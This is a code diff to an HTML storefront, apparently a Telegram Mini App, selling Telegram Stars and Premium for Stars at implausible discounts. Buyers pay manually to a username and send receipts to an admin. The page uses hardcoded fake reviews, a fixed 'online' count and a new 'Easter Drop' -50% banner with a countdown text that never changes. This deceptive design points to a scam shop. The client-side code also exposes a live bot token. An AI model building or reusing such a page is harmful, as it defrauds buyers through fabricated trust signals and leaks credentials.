@@ -8,21 +8,29 @@
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-        :root { --accent: #0088cc; --bg: #030303; }
+        :root { --accent: #0088cc; --bg: #030303; --neon: #00f2ff; }
         body { background-color: var(--bg); color: #ffffff; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
+        
         .premium-card { background: linear-gradient(145deg, #0f0f0f 0%, #050505 100%); border: 1px solid rgba(255, 255, 255, 0.03); border-radius: 24px; transition: all 0.4s; overflow: hidden; }
         .active-tab { color: var(--accent); border-bottom: 3px solid var(--accent); }
         .glow-btn { background: linear-gradient(135deg, var(--accent) 0%, #005580 100%); box-shadow: 0 10px 20px rgba(0, 136, 204, 0.3); }
         .modal-overlay { display: none; backdrop-filter: blur(15px); background: rgba(0,0,0,0.85); position: fixed; inset: 0; z-index: 50; padding: 1.5rem; align-items: center; justify-content: center; }
         .cart-badge { position: absolute; top: -5px; right: -5px; background: #ef4444; font-size: 10px; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; border: 2px solid var(--bg); animation: pulse 2s infinite; }
+        
+        /* Easter Styles */
+        #easter-banner { border: 1px solid rgba(0, 242, 255, 0.3); position: relative; overflow: hidden; }
+        .css-egg {
+            width: 50px; height: 70px; border-radius: 50% 50% 50% 50% / 60% 60% 40% 40%;
+            background: radial-gradient(circle at 30% 30%, var(--neon), #0044ff);
+            box-shadow: 0 0 20px rgba(0, 242, 255, 0.4); animation: float 3s infinite alternate ease-in-out;
+        }
+        @keyframes float { from { transform: translateY(0) rotate(0deg); } to { transform: translateY(-10px) rotate(5deg); } }
+        .discount-text { text-shadow: 0 0 10px var(--neon); }
+        
         .live-notif { position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-100px); background: rgba(15, 15, 15, 0.9); border: 1px solid var(--accent); padding: 10px 20px; border-radius: 50px; z-index: 100; font-size: 11px; transition: 0.5s; width: 90%; max-width: 320px; }
         .live-notif.show { transform: translateX(-50%) translateY(0); }
         .vip-status { font-size: 10px; padding: 2px 8px; border-radius: 20px; font-weight: 900; text-transform: uppercase; }
-        .resale-tag { background: #4ade80; color: #000; font-size: 8px; font-weight: 900; padding: 2px 8px; border-radius: 4px; text-transform: uppercase; }
         .review-bubble { background: #0a0a0a; border-radius: 18px; padding: 15px; border: 1px solid rgba(255,255,255,0.05); }
-        .verified-badge { background: rgba(0, 136, 204, 0.1); color: var(--accent); font-size: 8px; font-weight: 900; padding: 2px 6px; border-radius: 4px; display: inline-flex; align-items: center; gap: 3px; }
-        .instant-badge { background: linear-gradient(90deg, #f59e0b, #d97706); color: white; padding: 4px 10px; border-radius: 8px; font-size: 10px; font-weight: 900; margin-top: 8px; display: inline-block; animation: bounce 2s infinite; }
-        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-3px); } }
     </style>
 </head>
 <body class="min-h-screen flex flex-col items-center p-5">
@@ -34,9 +42,9 @@
 
     <header class="w-full max-w-md flex justify-between items-center py-6">
         <div class="text-left">
-            <h1 class="text-4xl font-black italic tracking-tighter leading-none">STARS <span class="text-cyan-500">ELITE</span></h1>
+            <h1 class="text-4xl font-black italic tracking-tighter leading-none uppercase">Stars <span class="text-cyan-500">Elite</span></h1>
             <div class="flex items-center mt-2 gap-2">
-                <span class="text-[8px] font-bold text-gray-500">ONLINE: <span id="online-count" class="text-green-500">168</span></span>
+                <span class="text-[8px] font-bold text-gray-500 uppercase">Online: <span class="text-green-500">241</span></span>
                 <span id="rank-badge" class="vip-status bg-gray-800 text-gray-400">Bronze</span>
             </div>
         </div>
@@ -46,12 +54,23 @@
         </button>
     </header>
 
+    <div id="easter-section" class="w-full max-w-md mb-6">
+        <div id="easter-banner" class="premium-card p-6 flex items-center justify-between">
+            <div>
+                <h2 class="text-xl font-black italic uppercase discount-text">Easter Drop</h2>
+                <p class="text-[10px] text-cyan-500 font-bold tracking-widest uppercase">Limited Event: -50% Stars</p>
+                <p id="countdown" class="text-[9px] text-gray-600 mt-2 font-mono">Ends in: 04d 12h 30m</p>
+            </div>
+            <div class="css-egg"></div>
+        </div>
+    </div>
+
     <div class="w-full max-w-md flex-1 overflow-y-auto pb-40">
         <div class="flex mb-6 border-b border-white/5 sticky top-0 bg-[#030303]/90 backdrop-blur-md z-10">
-            <button onclick="switchTab('stars')" id="tab-stars" class="flex-1 py-4 text-[10px] font-black tracking-widest active-tab uppercase transition-all">STARS</button>
-            <button onclick="switchTab('premium')" id="tab-premium" class="flex-1 py-4 text-[10px] font-black tracking-widest text-gray-600 uppercase transition-all">PREMIUM</button>
-            <button onclick="switchTab('nft')" id="tab-nft" class="flex-1 py-4 text-[10px] font-black tracking-widest text-gray-600 uppercase transition-all">GIFTS</button>
-            <button onclick="switchTab('reviews')" id="tab-reviews" class="flex-1 py-4 text-[10px] font-black tracking-widest text-gray-600 uppercase transition-all">REVIEWS</button>
+            <button onclick="switchTab('stars')" id="tab-stars" class="flex-1 py-4 text-[10px] font-black tracking-widest active-tab uppercase">Stars</button>
+            <button onclick="switchTab('premium')" id="tab-premium" class="flex-1 py-4 text-[10px] font-black tracking-widest text-gray-600 uppercase">Premium</button>
+            <button onclick="switchTab('easter')" id="tab-easter" class="flex-1 py-4 text-[10px] font-black tracking-widest text-gray-600 uppercase">Easter 🐣</button>
+            <button onclick="switchTab('reviews')" id="tab-reviews" class="flex-1 py-4 text-[10px] font-black tracking-widest text-gray-600 uppercase">Reviews</button>
         </div>
         <div id="product-list" class="grid grid-cols-1 gap-4 px-1"></div>
     </div>
@@ -67,11 +86,10 @@
                 <button onclick="closeModal('cart-modal')" class="text-gray-500"><i class="fa-solid fa-xmark text-xl"></i></button>
             </div>
             <div id="cart-items" class="flex-1 overflow-y-auto space-y-4 mb-6 pr-2"></div>
-            <div class="border-t border-white/10 pt-4 mb-6">
-                <div class="flex justify-between items-center">
-                    <span class="text-gray-500 font-bold uppercase text-[10px]">К оплате:</span>
-                    <span id="total-price" class="text-2xl font-black text-cyan-500">0</span>
-                </div>
+            <div class="border-t border-white/10 pt-4 mb-6 text-right">
+                <span class="text-gray-500 font-bold uppercase text-[10px] block">К оплате:</span>
+                <span id="total-price" class="text-2xl font-black text-cyan-500">0</span>
+                <p id="easter-promo-text" class="text-[9px] text-green-500 font-bold uppercase hidden">Easter Promo Applied -50%</p>
             </div>
             <button onclick="checkout()" class="glow-btn py-5 rounded-2xl font-black uppercase text-sm tracking-widest">Перейти к оплате</button>
         </div>
@@ -79,22 +97,10 @@
 
     <div id="contact-modal" class="modal-overlay">
         <div class="premium-card w-full max-w-md p-8 text-center border border-white/10">
-            <div class="w-16 h-16 bg-cyan-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
-                <i class="fa-solid fa-bolt text-2xl text-cyan-500"></i>
-            </div>
-            <h2 class="text-2xl font-black mb-4 uppercase italic leading-none">Оплата заказа</h2>
-            
-            <div id="payment-instructions" class="text-left text-xs space-y-4 mb-6 bg-white/5 p-5 rounded-2xl border border-white/5">
-                <!-- Сюда вставится инструкция -->
-            </div>
-
-            <div class="space-y-4">
-                <p class="text-gray-500 text-[9px] uppercase font-bold tracking-widest">Скрин чека слать админу:</p>
-                <a href="https://t.me/dolbayob89" target="_blank" class="block glow-btn py-5 rounded-2xl font-black text-lg uppercase shadow-xl">
-                    <i class="fa-brands fa-telegram mr-2"></i> Отправить чек
-                </a>
-                <button onclick="closeModal('contact-modal')" class="text-gray-700 text-[10px] font-bold uppercase pt-2 hover:text-gray-500">Вернуться</button>
-            </div>
+            <h2 class="text-2xl font-black mb-4 uppercase italic">Оплата</h2>
+            <div id="payment-instructions" class="text-left text-xs space-y-4 mb-6 bg-white/5 p-5 rounded-2xl"></div>
+            <a href="https://t.me/dolbayob89" target="_blank" class="block glow-btn py-5 rounded-2xl font-black text-lg uppercase"><i class="fa-brands fa-telegram mr-2"></i> Отправить чек</a>
+            <button onclick="closeModal('contact-modal')" class="text-gray-700 text-[10px] font-bold uppercase mt-4">Назад</button>
         </div>
     </div>
 
@@ -103,144 +109,128 @@
         const ADMIN_ID = "7811669365";
         const BOT_TOKEN = "8693212521:AAE6y0aa5pPeMx6Oa8uRI1f8PvConZGNOiQ";
 
+        // AUTO-EXPIRY LOGIC (12 April 2026)
+        const expiryDate = new Date("2026-04-13T00:00:00");
+        const isEasterActive = new Date() < expiryDate;
+
+        if (!isEasterActive) {
+            document.getElementById('easter-section').remove();
+            document.getElementById('tab-easter').remove();
+        }
+
         let currentMode = 'stars';
-        let cart = JSON.parse(localStorage.getItem('elite_cart') || '[]');
+        let cart = [];
 
         const items = {
             stars: [
                 { id: 'st1', val: '25 Stars', cost: 15, cur: '⭐️', icon: 'fa-bolt' },
-                { id: 'st3', val: '100 Stars', cost: 50, cur: '⭐️', icon: 'fa-bolt' },
-                { id: 'st6', val: '400 Stars', cost: 115, cur: '⭐️', icon: 'fa-bolt' },
                 { id: 'st10', val: '1000 Stars', cost: 250, cur: '⭐️', icon: 'fa-bolt' }
             ],
             premium: [
-                { id: 'p3', val: 'Premium 3 Месяца', cost: 45, cur: '⭐️', icon: 'fa-star' },
-                { id: 'p6', val: 'Premium 6 Месяцев', cost: 75, cur: '⭐️', icon: 'fa-star' },
-                { id: 'p12', val: 'Premium 12 Месяцев', cost: 135, cur: '⭐️', icon: 'fa-star' }
+                { id: 'p12', val: 'Premium 1 Year', cost: 135, cur: '⭐️', icon: 'fa-star' }
             ],
-            nft: [
-                { id: 'n1', val: 'Vice Cream', cost: 275, cur: '⭐️', icon: 'fa-ice-cream' },
-                { id: 'n2', val: 'Choco Ice', cost: 325, cur: '⭐️', icon: 'fa-ice-cream' },
-                { id: 'n3', val: 'Blue Socks', cost: 390, cur: '⭐️', icon: 'fa-socks' },
-                { id: 'n4', val: 'Stellar Rocket', cost: 440, cur: '⭐️', icon: 'fa-rocket' }
+            easter: [
+                { id: 'e1', val: 'Easter Bundle (1k)', cost: 125, cur: '⭐️', icon: 'fa-egg' },
+                { id: 'e2', val: 'Golden Egg (5k)', cost: 600, cur: '⭐️', icon: 'fa-egg' }
             ],
             reviews: [
-                { user: 'Anon', text: 'Забрал подарки, цена огонь. На фрагменте они реально в 10 раз дороже. Админ лучший!', date: 'Сегодня, 14:20' },
-                { user: 'Anon', text: 'Премиум на год прилетел через 5 мин после оплаты. Доплатил за скорость, оно того стоит.', date: 'Сегодня, 11:05' },
-                { user: 'Anon', text: 'Взял 1000 звезд, все четко. Лучший сервис.', date: 'Вчера, 18:40' }
+                { user: 'Anon', text: 'Успел на пасхальный дроп, цены сказка.', date: 'Сегодня' }
             ]
         };
 
-        function saveCart() { localStorage.setItem('elite_cart', JSON.stringify(cart)); updateCartCounter(); updateRank(); }
         function switchTab(mode) { currentMode = mode; renderUI(); }
         function addToCart(id) {
             const product = items[currentMode].find(i => i.id === id);
             cart.push({...product, cartId: Math.random().toString(36).substr(2, 9)});
-            saveCart();
+            updateCartCounter();
+            showNotif(`Добавлено: ${product.val}`);
         }
-        function removeFromCart(cartId) { cart = cart.filter(i => i.cartId !== cartId); saveCart(); renderCartItems(); }
+
+        function showNotif(text) {
+            const el = document.getElementById('notif');
+            document.getElementById('notif-text').innerText = text;
+            el.classList.add('show');
+            setTimeout(() => el.classList.remove('show'), 2000);
+        }
+
         function updateCartCounter() {
             const badge = document.getElementById('cart-count');
             badge.innerText = cart.length;
             badge.classList.toggle('hidden', cart.length === 0);
         }
-        function updateRank() {
-            const badge = document.getElementById('rank-badge');
-            const len = cart.length;
-            if (len === 0) { badge.innerText = "Bronze"; badge.className = "vip-status bg-gray-800 text-gray-400"; }
-            else if (len < 3) { badge.innerText = "Silver"; badge.className = "vip-status bg-blue-900 text-blue-300"; }
-            else { badge.innerText = "Elite"; badge.className = "vip-status bg-cyan-900 text-cyan-300 shadow-lg shadow-cyan-500/20"; }
-        }
 
         function renderUI() {
-            ['stars', 'premium', 'nft', 'reviews'].forEach(t => document.getElementById('tab-'+t).className = `flex-1 py-4 text-[10px] font-black tracking-widest uppercase ${currentMode === t ? 'active-tab' : 'text-gray-600'}`);
+            const tabs = ['stars', 'premium', 'easter', 'reviews'];
+            tabs.forEach(t => {
+                const el = document.getElementById('tab-'+t);
+                if (el) el.className = `flex-1 py-4 text-[10px] font-black tracking-widest uppercase ${currentMode === t ? 'active-tab' : 'text-gray-600'}`;
+            });
             const list = document.getElementById('product-list');
             list.innerHTML = '';
 
             if (currentMode === 'reviews') {
                 items.reviews.forEach(rev => {
-                    list.innerHTML += `
-                        <div class="review-bubble mb-4">
-                            <div class="flex justify-between items-center mb-2">
-                                <span class="text-cyan-500 font-black text-xs">${rev.user}</span>
-                                <div class="verified-badge"><i class="fa-solid fa-check-double"></i> Verified</div>
-                            </div>
-                            <p class="text-sm text-gray-300 mb-2 italic">"${rev.text}"</p>
-                            <p class="text-[9px] text-gray-700 font-bold uppercase">${rev.date}</p>
-                        </div>`;
+                    list.innerHTML += `<div class="review-bubble mb-4"><span class="text-cyan-500 font-black text-xs">${rev.user}</span><p class="text-sm italic mt-1">"${rev.text}"</p></div>`;
                 });
                 return;
             }
 
-            items[currentMode].forEach((item) => {
+            items[currentMode].forEach(item => {
                 list.innerHTML += `
-                    <div class="premium-card p-5 border border-white/5">
-                        <div class="flex justify-between items-start mb-4">
-                            <div class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center text-cyan-500 text-xl">
-                                <i class="fa-solid ${item.icon}"></i>
-                            </div>
-                            ${currentMode === 'nft' ? `<div class="resale-tag">Fragment</div>` : ''}
-                        </div>
-                        <div class="flex justify-between items-end w-full">
+                    <div class="premium-card p-5 mb-2">
+                        <div class="flex justify-between items-center">
                             <div>
-                                <h3 class="text-lg font-black italic uppercase leading-none">${item.val}</h3>
-                                <p class="text-cyan-500 font-black mt-2">${item.cost} ${item.cur}</p>
+                                <h3 class="font-black italic uppercase">${item.val}</h3>
+                                <p class="text-cyan-500 font-black">${item.cost} ${item.cur}</p>
                             </div>
-                            <button onclick="addToCart('${item.id}')" class="glow-btn w-12 h-12 rounded-xl flex items-center justify-center transition-all active:scale-90">
-                                <i class="fa-solid fa-plus text-black"></i>
-                            </button>
+                            <button onclick="addToCart('${item.id}')" class="glow-btn w-10 h-10 rounded-xl flex items-center justify-center"><i class="fa-solid fa-plus text-black"></i></button>
                         </div>
                     </div>`;
             });
         }
 
-        function renderCartItems() {
+        function openCart() {
             const container = document.getElementById('cart-items');
-            container.innerHTML = cart.length === 0 ? '<div class="text-center py-10 text-gray-700 font-bold uppercase text-[10px]">Корзина пуста</div>' : '';
-            let totals = {};
+            container.innerHTML = cart.length === 0 ? '<p class="text-center text-gray-600 uppercase text-[10px] font-bold py-10">Empty</p>' : '';
+            let total = 0;
             cart.forEach(item => {
-                totals[item.cur] = (totals[item.cur] || 0) + item.cost;
-                container.innerHTML += `
-                    <div class="bg-white/5 p-4 rounded-2xl flex justify-between items-center border border-white/5">
-                        <div class="flex items-center">
-                            <div class="w-10 h-10 bg-cyan-500/10 rounded-lg flex items-center justify-center mr-4 text-cyan-500"><i class="fa-solid ${item.icon}"></i></div>
-                            <div><p class="text-sm font-black italic uppercase">${item.val}</p><p class="text-[10px] text-cyan-500 font-bold">${item.cost} ${item.cur}</p></div>
-                        </div>
-                        <button onclick="removeFromCart('${item.cartId}')" class="text-red-900/50 hover:text-red-500 p-2"><i class="fa-solid fa-trash-can"></i></button>
-                    </div>`;
+                total += item.cost;
+                container.innerHTML += `<div class="flex justify-between items-center bg-white/5 p-3 rounded-xl mb-2"><span>${item.val}</span><span class="text-cyan-500 font-bold">${item.cost} ⭐️</span></div>`;
             });
-            document.getElementById('total-price').innerText = Object.entries(totals).map(([cur, val]) => `${val} ${cur}`).join(' + ');
+
+            // EASTER DISCOUNT LOGIC
+            const promoText = document.getElementById('easter-promo-text');
+            if (isEasterActive && total >= 250) {
+                total = Math.floor(total * 0.5);
+                promoText.classList.remove('hidden');
+            } else {
+                promoText.classList.add('hidden');
+            }
+
+            document.getElementById('total-price').innerText = total + " ⭐️";
+            document.getElementById('cart-modal').style.display = 'flex';
         }
 
-        function openCart() { renderCartItems(); document.getElementById('cart-modal').style.display = 'flex'; }
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
         function checkout() {
             if (cart.length === 0) return;
-            let total = 0; cart.forEach(i => total += i.cost);
+            let total = cart.reduce((s, i) => s + i.cost, 0);
+            let usedPromo = false;
+            if (isEasterActive && total >= 250) {
+                total = Math.floor(total * 0.5);
+                usedPromo = true;
+            }
             
-            const instr = `
-                <div class="space-y-4">
-                    <div>
-                        <p class="font-black text-white mb-2 uppercase text-[10px] tracking-widest text-gray-500">Инструкция:</p>
-                        <p class="text-sm">1. Отправь <span class="text-cyan-500 font-black">${total} ⭐️</span> на пользователя <span class="bg-white/10 px-2 py-1 rounded text-cyan-400 font-mono">${USERNAME}</span></p>
-                    </div>
-                    <div class="border-t border-white/5 pt-4">
-                        <div class="instant-badge">FAST DELIVERY AVAILABLE</div>
-                        <p class="text-[11px] leading-relaxed mt-2">⚡ Для <b>мгновенной</b> выдачи (в течение 5 мин) добавьте еще <span class="text-yellow-500 font-bold">15 ⭐️</span> к сумме перевода.</p>
-                        <p class="text-[10px] text-gray-600 mt-1 italic">* Обычная выдача занимает до 48-ми часов.</p>
-                    </div>
-                </div>`;
-            
-            document.getElementById('payment-instructions').innerHTML = instr;
+            document.getElementById('payment-instructions').innerHTML = `Отправьте <b>${total} ⭐️</b> на <code>${USERNAME}</code><br><br><span class="text-[10px] text-gray-500 uppercase font-bold">Скрин чека в ЛС админу.</span>`;
             closeModal('cart-modal');
             document.getElementById('contact-modal').style.display = 'flex';
-            
-            const msg = `💎 <b>NEW ORDER</b>\n\n💰 <b>Total:</b> ${total} Stars\n🛒 <b>Items:</b>\n${cart.map(i=>`• ${i.val}`).join('\n')}`;
-            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`).catch(()=>{});
+
+            const msg = `🚀 <b>ORDER</b>\nSum: ${total} Stars\nPromo: ${usedPromo ? 'YES' : 'NO'}\nItems: ${cart.map(i=>i.val).join(', ')}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
         }
 
-        window.onload = () => { renderUI(); updateCartCounter(); updateRank(); };
+        window.onload = renderUI;
     </script>
 </body>
 </html>
